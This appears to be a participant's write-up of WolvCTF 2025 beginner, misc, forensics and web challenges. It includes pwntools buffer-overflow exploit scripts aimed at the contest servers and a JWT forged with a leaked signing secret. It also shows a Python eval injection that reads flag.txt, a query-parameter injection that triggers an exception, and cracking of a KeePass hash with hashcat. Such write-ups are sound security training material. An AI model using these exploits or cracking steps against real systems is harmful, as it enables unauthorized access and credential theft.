# [WolvCTF 2025](https://wolvctf.io/)

---

# Beginner
## REverse
I hate when when RE challenges just make me do something backwards...

Resource: 
- [./reverse](beginner/reverse)
- `out.txt`
```
Mixed Flag: t`qcxo0s0o2.kd\.k\o0s0o20z
```

### Methology
As usual using any reversing tools, the main issue is to reverse mix_flag function.
```
__int64 __fastcall mix_flag(__int64 a1, __int64 a2, int a3)
{
  __int64 result; // rax
  char v4; // [rsp+17h] [rbp-Dh]
  int i; // [rsp+18h] [rbp-Ch]
  int j; // [rsp+1Ch] [rbp-8h]

  // Step 1: Reversing Character Shift (-3)
  for ( i = 0; i < a3; ++i )
    *(_BYTE *)(i + a2) = *(_BYTE *)(i + a1) - 3;

  // Step 2: Swapping Characters (Reversing Pair Swaps)
  for ( j = 0; ; j += 2 )
  {
    result = (unsigned int)(a3 - 1);
    if ( j >= (int)result )
      break;
    v4 = *(_BYTE *)(j + a2);
    *(_BYTE *)(j + a2) = *(_BYTE *)(a3 - 1 - (j + 1) + a2);
    *(_BYTE *)(a2 + a3 - 1 - (j + 1)) = v4;
  }
  return result;
}
```
Parameters:
- a1: Pointer to the obfuscated flag (source).
- a2: Pointer to the output buffer (destination).
- a3: index of a2.


### Solution
Reversing to [C code](beginner/reverse.c):
```
#include <stdio.h>
#include <string.h>

int main() {
    char flag[] = "t`qcxo0s0o2.kd\\.k\\o0s0o20z";
    char input[100];  
    int index = strlen(flag) - 1;

    for (int i = 0; i < strlen(flag); i++) {
        input[i] = flag[i] + 3;
    }
    input[strlen(flag)] = '\0'; // Null-terminate the modified string

    for (int j = 0; j < index; j += 2) {
        char tmp = input[j];
        input[j] = input[index - j - 1];
        input[index - j - 1] = tmp;
    }

    printf("Mixed Flag: %s\n", input);
    return 0;
}
```

Alternatively, in python
```
flag = list("t`qcxo0s0o2.kd\\.k\\o0s0o20z")
index = len(flag) - 1
input_chars = [""] * len(flag)

# Step 1: Shift each character by +3 in ASCII
for i in range(len(flag)):
    input_chars[i] = chr(ord(flag[i]) + 3)

# Step 2: Reverse every two characters in the string
for j in range(0, index, 2):
    flag[j], flag[index - j - 1] = flag[index - j - 1], flag[j]

output_str = "".join(input_chars)
print(output_str)
```

flag: wctf{r3v3r51ng_1n_r3v3r53}


## REdata - Rev
An eZ RE challenge.

Resource: 
- [./redata](beginner/redata)

![alt text](beginner/rdata.png)

strings redata | grep wctf

flag: wctf{n0_w4y_y0u_f0unD_1t!}


## OverAndOver - Crypto
You found a strange string that seems to be encoded with base64... yet still scrambled after decoding...

Resource: 
- [encoded.txt](beginner/encoded.txt)

do multiple times of base64 decode

flag: wctf{bA5E_tWo_p0W_s!X}


## EtTuCaesar - Crypto
Caesar has left a you a note encrypted with his favorite cipher, but he seems to have jumbled things even further. Can you restore his message?

Resource: 
- [message.txt](beginner/message.txt)
```
t z c 3 S
q { k ! s
s ! a ! _
_ F Z ! !
_ ! 1 1 }
```

#### Read Column-wise
```
t q s _ _
z { ! F !
c k a Z 1
3 ! ! ! 1
S s _ ! }
```
![alt text](beginner/caesar.png)

Since we know the flag should begin with "wctf", it gives a hint that we need to read characters column by column from top to bottom, moving left to right, which is called column-major order.

flag: wctf{v3n!_V!dI_v!C!_!1!1}


## JWT Learning - Web
JWTs (JSON Web Tokens) are created at login and used by backends to efficiently verify certain things (claims) about the authenticated user.

Usually these cannot be tampered with because they are cryptographically signed.

Let's learn a little about JWTs and tamper with one in a badly-written web app.

This challenge will walk you through each step.

https://beginner-jwt-learning-974780027560.us-east5.run.app


Step 1: username input sam, the cookie we got:
`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNhbSIsImlzQWRtaW4iOmZhbHNlLCJpYXQiOjE3NDI3ODIxOTksImV4cCI6MTc0MjgwMDE5OX0.NLOPpgtXRdhvYDYX9erRZ-AsMkvJtEl1xEMKsnyrBuw`

![alt text](beginner/0.png)

use tool: https://jwt.io/

![alt text](beginner/1.png)

Step 2: change "isAdmin"= true
we got:
encoded: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNhbSIsImlzQWRtaW4iOnRydWUsImlhdCI6MTc0Mjc4MjE5OSwiZXhwIjoxNzQyODAwMTk5fQ.gnuMJ0S8eldMoVYFkmCtctr33PHQSS4QUlmCICC-0jo`

![alt text](beginner/2.png)


hints from : https://beginner-jwt-learning-974780027560.us-east5.run.app/robots.txt
![alt text](beginner/jwt1.png)

go to https://beginner-jwt-learning-974780027560.us-east5.run.app/TOKEN_SECRET.txt

find: fa43623fc456bf3a62ea923f4e7a009f0aeec4a0032670ed6fc90bd268e4c62c896699572b914cb15806695fcb1f6eb3141c9bc86a87cca1bda98e1429aa902b

![alt text](beginner/jwt2.png)

Step 3: set this key to VERIFY SIGNATURE window in https://jwt.io/

![alt text](beginner/3.png)

now encoded: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNhbSIsImlzQWRtaW4iOnRydWUsImlhdCI6MTc0Mjc4MjE5OSwiZXhwIjoxNzQyODAwMTk5fQ.x4qzzVEE6vt578PHziq6qf2ItH9N7yjAIgWdsUlHJNs`

change cookies and go to https://beginner-jwt-learning-974780027560.us-east5.run.app/get-flag

![alt text](beginner/jwt3.png)

flag:wctf{jw7_l34rn1n6_15_fun_135624154}


## PicturePerfect - Forensics
Wow what a respectful, happy looking lad! Hmmmmmmm, all I see is a snowman... maybe some details from the image file itself will lead us to the flag.

Resource: 
- [hi_snowman.png](beginner/hi_snowman.png)

![alt text](beginner/snow.png)

see title: wctf{d0_yOU_w@nt_t0_BUiLd_a_Sn0Wm@n}

## DigginDir - Forensics
So I tripped on an uneven sidewalk today.... and I dropped the flag somewhere (oops). It's gotta be here somewhere..... right?

Resource: 
- [challenge/](beginner/challenge/)

search all relative text in the folder

![alt text](beginner/diggindir.png)

flag: wctf{0h_WOW_tH@Nk5_yOu_f0U^d_1t_xD}

## p0wn3d - Pwn
An introduction to pwn challenges. This is to protect the babies from last year!

nc p0wn3d.kctf-453514-codelab.kctf.cloud 1337

Resource: 
- [main.c](beginner/p0wn3d%20-%20Pwn/main.c)

### Exploit Strategy
To trigger get_flag(), we need to:
1. Overflow buf (write 32 junk bytes).
2. Overwrite guard with 0x42424242.

check [script.py](beginner/p0wn3d%20-%20Pwn/script.py)

```
from pwn import *

# Set up connection to the remote server
host = "p0wn3d.kctf-453514-codelab.kctf.cloud"
port = 1337

# Create a remote connection
p = remote(host, port)

elf = context.binary = ELF('./chal')

# p = process()
# p = gdb.debug('./chal', '''
# b *main+97
# continue
# ''')

p.recvuntil('words?')
payload = b'B'*(64)
payload += p32(0x42424242)


p.sendline(payload)

p.interactive()
```

flag: wctf{pwn_1s_l0v3_pwn_1s_l1f3}

## p0wn3d_2 - Pwn
You can scream... Whatever. Can you be precise tho?

nc p0wn3d2.kctf-453514-codelab.kctf.cloud 1337

Resource: 
- [main.c](beginner/p0wn3d_2%20-%20Pwn/main.c)

### Exploit Strategy
To trigger get_flag(), we need to:
1. Fill buf with 32 junk bytes.
2. Overwrite guard1 with 0xdeadbeef (\xef\xbe\xad\xde in little-endian).
3. Overwrite guard2 with 0x0badc0de (\xde\xc0\xad\x0b in little-endian).

check [script.py](beginner/p0wn3d_2%20-%20Pwn/script.py)

```
from pwn import *

# Set up connection to the remote server
host = "p0wn3d2.kctf-453514-codelab.kctf.cloud"
port = 1337

# Create a remote connection
p = remote(host, port)

elf = context.binary = ELF('./chal')

# p = process()
# p = gdb.debug('./chal', '''
# b *main+97
# continue
# ''')

p.recvuntil('yourself?')
payload = b'B'*(32)
payload += p32(0xdeadbeef)
payload += p32(0x0badc0de)


p.sendline(payload)

p.interactive()
```


flag: wctf{4ll_y0uR_mEm_4r3_bel0ng_2_Us}

## p0wn3d_3 - Pwn
Time for a little bit of control flow redirection

nc p0wn3d3.kctf-453514-codelab.kctf.cloud 1337

Resource: 
- [main.c](beginner/p0wn3d_3%20-%20Pwn/main.c)

### Exploit Strategy
We need to:

1. Fill buf (32 bytes) with junk.
2. Write extra padding to reach the return address.
3. Overwrite the return address with the address of get_flag().

check [script.py](beginner/p0wn3d_3%20-%20Pwn/script.py)

```
from pwn import *

# Set up connection to the remote server
host = "p0wn3d3.kctf-453514-codelab.kctf.cloud"
port = 1337

# Create a remote connection
p = remote(host, port)

elf = context.binary = ELF('./chal')

# p = process()
# p = gdb.debug('./chal', '''
# b *main+45
# continue
# ''')

p.recvuntil('before')
payload = b'B'*(32+8)
payload += p64(0x004011a5)


p.sendline(payload)

p.interactive()
```


flag: wctf{gr4dua73d_fr0m_l1ttl3_p0wn3r!}

---

# Misc
## Eval is Evil
If eval is so bad, then why is it so easy to use?

nc evalisevil.kctf-453514-codelab.kctf.cloud 1337

Resource: 
- [chall.py](Eval%20is%20Evil/chall.py)

### Methology:
	the eval() function evaluates a string as a Python expression and returns the result.
	❌ Cannot execute statements (loops, conditionals, assignments)
	❌ Cannot define functions or classes
	❌ Can be dangerous if misused with untrusted input
	✅ Only evaluates single expressions
	✅ Can be restricted using custom globals
1. It's impossible in a limited time to guess an integer in range `random.randint(0, 2**64)`
2. We need to figure out a way to bypass the randomization
3. Flag is in a text file after all; why not open the `flag.txt` in eval() function?


### Solution
payload:
`print(open("flag.txt", "r").readline())`

![alt text](Eval%20is%20Evil/eval.png)

flag: wctf{Why_Gu3ss_Wh3n_Y0u_C4n_CH34T}


---

# Forensics
## Passwords
I heard you're a hacker. Can you help me get my passwords back?

Resource: 
- [Database.kdbx](Database.kdbx) (keepass with password)

### Methology:
tool: https://hashes.com/en/johntheripper/keepass2john
keepass2john is a tool from John the Ripper (JtR) used to extract password hashes from KeePass databases (.kdbx files). These hashes can then be cracked using John the Ripper or other password-cracking tools.
![alt text](kee1.png)

Now we extract the password hash: `$keepass$*2*6000*0*5bd85bff1c654df5d8cb8f64b877ea179b66978615917c39faf6edd98444928b*dec1f1a8a46d2257b1c536800ccea618d15523c983162f1a760d0f0e3f32bed6*02dc62f9e295c9a256e4e231b3102c1a*8ed6478291ac58151a98e7465f10a11e8cafc1706d048ef4f94fe51453f091bc*193dd9a5673c4a3f5b33dd59639f27760f03285044f14eacc652f4a441b45413`

To store the extracted hash from keepass2john into a file for easier access, use the following one-liner:
`echo "$keepass$*2*6000*0*5bd85bff1c654df5d8cb8f64b877ea179b66978615917c39faf6edd98444928b*dec1f1a8a46d2257b1c536800ccea618d15523c983162f1a760d0f0e3f32bed6*02dc62f9e295c9a256e4e231b3102c1a*8ed6478291ac58151a98e7465f10a11e8cafc1706d048ef4f94fe51453f091bc*193dd9a5673c4a3f5b33dd59639f27760f03285044f14eacc652f4a441b45413" >> hash.txt`

[hashcat hash types table](https://hashcat.net/wiki/doku.php?id=example_hashes)
`hashcat -a 0 -m 13400 hash.txt /usr/share/wordlists/rockyou.txt`

    ✅ -a 0 → Attack mode 0 (Straight/Dictionary Attack)
    ✅ -m 13400 → Hash mode 13400 (KeePass KDBX hashes)
    ✅ hash.txt → File containing the extracted KeePass hash
    ✅ /usr/share/wordlists/rockyou.txt → Wordlist for cracking (RockYou password list)

![alt text](kee2.png)

tool: [online keepass database](https://app.keeweb.info/)
open Database.kdbx use the password `goblue1`, and click password "*******" line:

![alt text](kee3.png)

flag: wctf{1_th0ught_1t_w4s_s3cur3?}


---

# Web
## Javascript Puzzle
It is often useful to force exceptions to potentially get back valuable information.

Can you make a request which causes an exception in this app?

https://js-puzzle-974780027560.us-east5.run.app

@author: SamXML

Resource: 
- [js/](js/)

In js/app.js, req.query.username can be an object or array, leading to unexpected behavior. If an error occurs, the app serves flag.txt, which may expose sensitive information.

### Test out
https://js-puzzle-974780027560.us-east5.run.app/?username[]=test

![alt text](pass1.png)

### Solution
https://js-puzzle-974780027560.us-east5.run.app/?username[toString]=fail

![alt text](pass2.png)

flag: wctf{3xc3pt10n5_4r3_y0ur_fr13nd_14285137553}